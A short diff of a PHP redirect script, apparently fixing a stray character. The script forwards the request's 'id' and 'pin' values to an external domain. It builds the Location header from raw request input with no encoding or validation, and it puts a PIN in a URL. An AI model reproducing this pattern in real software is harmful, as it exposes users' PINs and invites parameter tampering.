@@ -1,6 +1,6 @@
 <?php
 
-header('Location: https://pin.poverkadoma.ru/up?id='.$_REQUEST['id'].'.&pin='.$_REQUEST['pin']);
+header('Location: https://pin.poverkadoma.ru/up?id='.$_REQUEST['id'].'&pin='.$_REQUEST['pin']);
 exit;
 
 
